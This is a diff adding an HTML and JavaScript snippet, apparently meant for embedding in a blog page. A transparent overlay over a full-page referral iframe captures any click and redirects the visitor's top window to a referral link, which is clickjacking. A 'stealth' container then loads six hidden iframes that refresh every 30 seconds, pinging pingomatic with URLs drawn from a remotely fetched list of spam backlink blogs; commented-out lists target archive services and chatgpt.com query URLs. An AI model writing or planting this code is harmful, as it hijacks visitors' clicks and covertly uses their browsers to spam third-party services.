@@ -1,0 +1,413 @@
+<link href='https://trafficgenerator.github.io/api/custom-frame-styles.css' rel='stylesheet'/>
+
+<div id="container">
+<iframe id="fullIframe" src="https://www.followlike.net/?r=19384926"></iframe>
+<div id="clickCatcher"></div>
+</div>
+
+<script>
+      document.getElementById("clickCatcher").addEventListener("click", function () {
+        	//window.location.href = "http://folllike.com/?19384926";
+		
+		    // Changes top window; will throw if cross-origin
+		    top.location.href = 'http://folllike.com/?19384926';
+		    // or to replace current history:
+		    // top.location.replace('http://folllike.com/?19384926');
+      });
+</script>
+<!---------------------------------------------------------->
+
+<!---------------------------------------------------------->
+
+<div id="stealthIFrameContainer"></div>
+
+<script type="text/javascript">
+//<![CDATA[
+
+  
+// Multiplication array (array of arrays with archive URLs)
+const archiveURLs = [
+    [
+      	"https://pingomatic.com/ping/?title={{ENCODE_DOMAIN}}&blogurl={{ENCODE_URL}}&rssurl=http%3A%2F%2F&chk_blogs=on&chk_feedburner=on&chk_tailrank=on&chk_superfeedr=on"
+    ]
+  	/*
+    [
+      	"https://web.archive.org/save/{{URL}}"
+    ],
+  	[
+        "https://archive.today/submit/?anyway=1&url={{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url={{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url={{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url={{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url={{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url={{ENCODE_URL}}"
+    ],
+    [
+      	"https://cachedview.nl/#{{URL}}"
+    ],
+    [
+        "https://web.archive.org/save/https://chat.openai.com/?q={{ENCODE_URL}}",
+        "https://web.archive.org/save/http://chat.openai.com/?q={{ENCODE_URL}}",
+        "https://web.archive.org/save/https://chatgpt.com/?q={{ENCODE_URL}}",
+        "https://web.archive.org/save/http://chatgpt.com/?q={{ENCODE_URL}}",
+        "https://web.archive.org/save/http://www.chatgpt.com/?q={{ENCODE_URL}}",
+        "https://web.archive.org/save/https://www.chatgpt.com/?q={{ENCODE_URL}}",
+      
+        "https://web.archive.org/save/https://chat.openai.com/?hints=search&q={{ENCODE_URL}}",
+        "https://web.archive.org/save/http://chat.openai.com/?hints=search&q={{ENCODE_URL}}",
+        "https://web.archive.org/save/https://chatgpt.com/?hints=search&q={{ENCODE_URL}}",
+        "https://web.archive.org/save/http://chatgpt.com/?hints=search&q={{ENCODE_URL}}",
+        "https://web.archive.org/save/http://www.chatgpt.com/?hints=search&q={{ENCODE_URL}}",
+        "https://web.archive.org/save/https://www.chatgpt.com/?hints=search&q={{ENCODE_URL}}"
+    ],
+    [
+		"https://archive.today/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+		
+		
+		"https://archive.today/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fq%3D{{ENCODE_URL}}",
+		
+		
+		"https://archive.today/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+		
+		
+		"https://archive.today/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+		
+		
+		"https://archive.today/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+		
+		"https://archive.today/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fq%3D{{ENCODE_URL}}",
+      
+      	"https://archive.today/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=https%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+		
+		"https://archive.today/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=http%3A%2F%2Fchat.openai.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+		
+		"https://archive.today/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=https%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+		
+		"https://archive.today/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=http%3A%2F%2Fchatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+		
+		"https://archive.today/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=http%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+		
+		"https://archive.today/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.li/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.vn/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.fo/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.md/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}",
+        "https://archive.ph/submit/?anyway=1&url=https%3A%2F%2Fwww.chatgpt.com%2F%3Fhints%3Dsearch%26q%3D{{ENCODE_URL}}"
+    ]
+    */
+];
+
+// Simple URL check (basic regex)
+function isValidURL(url) {
+    const pattern = /^https?:\/\/[^\s]+$/i;
+    return pattern.test(url);
+}
+
+// Get random URL from random sub-array, retry until valid
+function getRandomArchiveURL() {
+    while (true) {
+        // pick random sub-array
+        const randomArray = archiveURLs[Math.floor(Math.random() * archiveURLs.length)];
+
+        if (!Array.isArray(randomArray) || randomArray.length === 0) continue;
+
+        // pick random URL inside it
+        const url = randomArray[Math.floor(Math.random() * randomArray.length)];
+
+        // validate and return
+        if (isValidURL(url)) {
+            return url;
+        }
+    }
+}
+
+function normalizeURL(url) {
+    if (typeof url !== "string") return "";
+
+    // Replace multiple slashes with a single slash, except after "http(s):"
+    return url.replace(/([^:]\/)\/+/g, "$1");
+}
+  
+const sumitUrlsToArchiveURLs = [
+		"https://smartbacklinkmaker.blogspot.com/",
+        "https://backlinkautogen.blogspot.com/",
+        "https://seobacklinkbuildertool.blogspot.com/",
+        "https://backlinkcreatorx.blogspot.com/",
+        "https://freebacklinkwizard.blogspot.com/",
+        "https://smartbacklinktools.blogspot.com/",
+        "https://autobacklinkgen.blogspot.com/",
+        "https://instantlinkmaker.blogspot.com/",
+        "https://mybacklinkbuilder.blogspot.com/",
+        "https://backlinkprotool.blogspot.com/",
+        "https://smartbacklinkbuilder.blogspot.com/",
+        "https://freelinkbuildertool.blogspot.com/",
+        "https://backlinkboosterfree.blogspot.com/",
+        "https://easybacklinkgenerator.blogspot.com/",
+        "https://onlinebacklinkcreator.blogspot.com/",
+        "https://freebacklinkgeneratorpro.blogspot.com/",
+        "https://turbobacklinkmaker.blogspot.com/",
+        "https://backlinkfactoryonline.blogspot.com/",
+        "https://backlinkboosttool.blogspot.com/",
+        "https://powerbacklinkmaker.blogspot.com/",
+        "https://quickbacklinkcreator.blogspot.com/",
+        "https://backlinkgeneratorhub.blogspot.com/",
+        "https://backlinktoolbox.blogspot.com/",
+        "https://backlinkmakerhub.blogspot.com/",
+        "https://instantbacklinkgenerator.blogspot.com/",
+        "https://freelinkbuilderlab.blogspot.com/",
+        "https://backlinkninjatool.blogspot.com/",
+        "https://generatorbacklinks.blogspot.com/",
+        "https://freebacklinkgeneratorblog.blogspot.com/",
+        "https://quickbacklinkmaker.blogspot.com/",
+        "https://backlinksmiths.blogspot.com/",
+        "https://mybacklinkgenerator.blogspot.com/",
+        "https://autobacklinkmaker.blogspot.com/",
+        "https://trustedbacklinkmaker.blogspot.com/",
+        "https://backlinktoolboxonline.blogspot.com/",
+        "https://backlinklabtools.blogspot.com/",
+        "https://rapidbacklinkbuilder.blogspot.com/",
+        "https://backlinkforgeonline.blogspot.com/",
+        "https://ultimatebacklinkgenerator.blogspot.com/",
+        "https://backlinkbuilderpro.blogspot.com/",
+        "https://backlinktoolboxfree.blogspot.com/",
+        "https://backlinkgeneratorlab.blogspot.com/",
+        "https://backlinkwizardfree.blogspot.com/",
+        "https://backlinkgenpro.blogspot.com/",
+        "https://buildmybacklinks.blogspot.com/",
+        "https://backlinkmakernet.blogspot.com/",
+        "https://backlinkbuilderlab.blogspot.com/",
+        "https://ultimatebacklinkmaker.blogspot.com/",
+        "https://freebacklinkmakeronline.blogspot.com/",
+        "https://superbacklinkmaker.blogspot.com/",
+        "https://simplebacklinkmaker.blogspot.com/",
+        "https://seo-backlinkgenerator.blogspot.com/",
+        "https://unlimitedbacklinkgenerator.blogspot.com/",
+        "https://powerfulbacklinkgenerator.blogspot.com/",
+        "https://instantseo-backlinks.blogspot.com/",
+        "https://automaticbacklinkgenerator.blogspot.com/",
+        "https://onlinebacklinkbuilder.blogspot.com/",
+        "https://seo-backlinktool.blogspot.com/",
+        "https://linkboostgenerator.blogspot.com/",
+        "https://probacklinktool.blogspot.com/",
+        "https://rankbacklinkmaker.blogspot.com/",
+        "https://backlinkhero.blogspot.com/",
+        "https://freeoneclickbacklink.blogspot.com/",
+        "https://powerbacklinkbuilder.blogspot.com/",
+        "https://smartlinkcreator.blogspot.com/",
+        "https://freebacklinktoolonline.blogspot.com/",
+        "https://freelinkgeneratortool.blogspot.com/",
+        "https://backlinkcreatorpro.blogspot.com/",
+        "https://autoseogenerator.blogspot.com/",
+        "https://backlinkbuilderonline.blogspot.com/",
+        "https://autobacklinkcreator.blogspot.com/",
+        "https://backlinkmakeronline.blogspot.com/",
+        "https://freeseobacklinkmaker.blogspot.com/",
+        "https://backlinkcreator360.blogspot.com/",
+        "https://megabacklinktool.blogspot.com/"
+];
+
+const fetchURLs = [
+  	"https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/backlink-generator-domains.json"
+];
+  
+function shuffle(array) {
+    for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+    }
+}
+
+async function updateDefaultURLs() {
+    shuffle(fetchURLs);
+    for (const url of fetchURLs) {
+        try {
+            const response = await fetch(url);
+            if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+            const data = await response.json();
+            if (Array.isArray(data) && data.length > 0) {
+                console.log("✅ Successfully loaded new URLs from:", url);
+                sumitUrlsToArchiveURLs.length = 0;
+                sumitUrlsToArchiveURLs.push(...data);
+                return;
+            }
+        } catch (error) {
+            console.warn(`⚠️ Failed to load from ${url}:`, error.message);
+        }
+    }
+}
+
+function getDomainName(url) {
+    try {
+        return new URL(url).hostname;
+    } catch {
+        return '';
+    }
+}
+
+function randomURL(array) {
+    const index = Math.floor(Math.random() * array.length);
+    return array[index];
+}
+  
+
+function normalizeURL(url) {
+    if (typeof url !== "string") return "";
+
+    // Replace multiple slashes with a single slash, except after "http(s):"
+    return url.replace(/([^:]\/)\/+/g, "$1");
+}
+  
+function buildUrl(templateUrl, inputUrl) {
+    function parseUrlParts(url) {
+        try {
+            const u = new URL(url);
+            const hostname = u.hostname;
+            const parts = hostname.split(".");
+
+            // heuristic: handle second-level TLDs like co.uk
+            const knownSecondLevel = ["co", "com", "org", "net", "gov", "ac", "edu"];
+            let subdomain = "", secondLevelDomain = "", topLevelDomain = "";
+
+            if (parts.length === 1) {
+                topLevelDomain = parts[0];
+            } else if (parts.length === 2) {
+                secondLevelDomain = parts[0];
+                topLevelDomain = parts[1];
+            } else {
+                topLevelDomain = parts[parts.length - 1];
+                secondLevelDomain = parts[parts.length - 2];
+                subdomain = parts.slice(0, parts.length - 2).join(".");
+
+                if (knownSecondLevel.includes(parts[parts.length - 2])) {
+                    topLevelDomain = parts.slice(-2).join("."); // e.g. co.uk
+                    secondLevelDomain = parts[parts.length - 3] || "";
+                    subdomain = parts.slice(0, parts.length - 3).join(".");
+                }
+            }
+
+            let subdirectory = u.pathname || "";
+            if (subdirectory.startsWith("/")) subdirectory = subdirectory.slice(1);
+            if (subdirectory.endsWith("/")) subdirectory = subdirectory.slice(0, -1);
+
+            return {
+                SCHEME: u.protocol.replace(":", ""),
+                SUBDOMAIN: subdomain || "",
+                SECOND_LEVEL_DOMAIN: secondLevelDomain || "",
+                TOP_LEVEL_DOMAIN: topLevelDomain || "",
+                SUBDIRECTORY: subdirectory || "",
+                HOSTNAME: u.hostname,
+                URL: url,
+                ENCODE_URL: encodeURIComponent(url),
+                ENCODE_URL: encodeURIComponent(url),
+                DOMAIN: u.hostname,
+                ENCODE_DOMAIN: encodeURIComponent(u.hostname),
+                ENCODE_HOSTNAME: encodeURIComponent(u.hostname),
+                ENCODE_SUBDIRECTORY: encodeURIComponent(subdirectory),
+                PATHNAME: u.pathname,
+                ENCODE_PATHNAME: encodeURIComponent(u.pathname),
+                QUERY: u.search,
+                HASH: u.hash,
+                PORT: u.port || ""
+            };
+        } catch (e) {
+            console.error("Invalid URL:", url);
+            return {};
+        }
+    }
+
+    const parts = parseUrlParts(inputUrl);
+
+    return templateUrl.replace(/{{\s*(.*?)\s*}}/g, (_, key) => {
+        return parts[key.toUpperCase()] !== undefined ? parts[key.toUpperCase()] : "";
+    });
+}
+
+
+function generateArchiveURL() {
+    const url1 = randomURL(sumitUrlsToArchiveURLs);
+    const url2 = randomURL(sumitUrlsToArchiveURLs);
+    
+    return buildUrl(getRandomArchiveURL(), url1+"?"+url2);
+    
+}
+
+const iframeContainer = document.getElementById("stealthIFrameContainer");
+
+function createIframe(i) {
+    const iframe = document.createElement("iframe");
+    iframe.name = "hiddenFrame" + i;
+    iframe.classList.add("hidden-iframe");
+    iframe.style.width = "100%";
+    iframe.style.height = "300px";
+    iframe.src = generateArchiveURL();
+    iframeContainer.appendChild(iframe);
+
+    setInterval(() => {
+        iframe.src = generateArchiveURL();
+    }, 30000); // update every 30 seconds
+}
+
+// Start
+updateDefaultURLs().then(() => {
+	for (let i = 0; i < 6; i++) {
+    	createIframe(i); // you can change "0" to a loop if you want more
+    }
+});
+
+//]]>
+</script>
